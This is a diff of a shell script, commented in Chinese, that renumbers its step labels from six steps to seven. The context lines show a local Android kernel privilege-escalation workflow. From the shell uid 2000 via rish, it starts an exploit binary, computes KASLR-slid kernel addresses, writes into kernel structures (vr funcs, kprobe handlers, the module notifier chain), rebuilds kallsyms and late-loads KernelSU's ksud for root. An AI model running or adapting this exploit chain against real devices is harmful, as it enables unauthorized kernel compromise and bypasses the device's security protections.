@@ -124,7 +124,7 @@ zero_check() { # $1=标签
 }
 
 # ---------- 0. 环境 ----------
-say "[0/6] 环境检查"
+say "[1/7] 环境检查"
 say "  id=$(id)"
 [ "$(id -u)" = "2000" ] || say "[!] 不是 uid=2000，请确认在 rish 里运行"
 
@@ -162,7 +162,7 @@ if ps -A -o PID,NAME 2>/dev/null | grep -q '[t]imer98260'; then
 fi
 
 # ---------- 1. 起 exploit ----------
-say "[1/6] 启动 fake exploit（setsid 脱离当前 shell）"
+say "[2/7] 启动 fake exploit（setsid 脱离当前 shell）"
 cd "$D" || die "进不去 $D"
 rm -f "$LOG"
 setsid sh -c 'nohup ./timer98260 fake > fakeR.log 2>&1 < /dev/null &' 2>/dev/null \
@@ -188,7 +188,7 @@ hadd "$IMAGE_BASE" "$SLIDE_DEC"; BASE="$HOUT"
 hadd "$BASE" 50331648; LIMIT="$HOUT"
 
 # ---------- 2. vr funcs ----------
-say "[2/6] 清 vr funcs"
+say "[3/7] 清 vr funcs"
 hadd "$TRACE_SYS_EXIT" "$SLIDE_DEC"
 hadd "$HOUT" 72; VR="$HOUT"
 plant "$VR" 0 || die "VR PLANT FAILED"
@@ -196,7 +196,7 @@ kread "$VR"; zero_check "vr funcs"
 say "  vr funcs after = ${KV0:-none}"
 
 # ---------- 3. kprobe 聚合节点 / pre_handler ----------
-say "[3/6] 扫 kprobe 桶，找聚合节点"
+say "[4/7] 扫 kprobe 桶，找聚合节点"
 hadd "$LOAD_MODULE" "$SLIDE_DEC"; LM="$HOUT"
 hadd "$KPROBE_TABLE" "$SLIDE_DEC"; TB="$HOUT"
 say "  lm=$LM"
@@ -260,7 +260,7 @@ else
 fi
 
 # ---------- 4. notifier 链 ----------
-say "[4/6] 截断 module notifier 链"
+say "[5/7] 截断 module notifier 链"
 hadd "$MODULE_NOTIFY_LIST" "$SLIDE_DEC"; NH="$HOUT"
 hadd "$NH" 64; kread "$HOUT"; NODE=${KV0:-}
 say "  notifier head $NODE"
@@ -290,7 +290,7 @@ fi
 say "  ALL PLANTS OK"
 
 # ---------- 5. kallsyms ----------
-say "[5/6] 生成 kallsyms（128943 行，几十秒）"
+say "[6/7] 生成 kallsyms（128943 行，几十秒）"
 while read -r _a _t _n; do
   [ -z "$_a" ] && continue
   hadd "$_a" "$SLIDE_DEC"
@@ -299,7 +299,7 @@ done < "$D/symbols.txt" > "$D/kall"
 say "  KALLSYMS_OK $(wc -l < "$D/kall" | tr -d ' ')"
 
 # ---------- 6. late-load ----------
-say "[6/6] ksud late-load"
+say "[7/7] ksud late-load"
 {
   echo 'echo ===LOAD==='
   echo 'id'
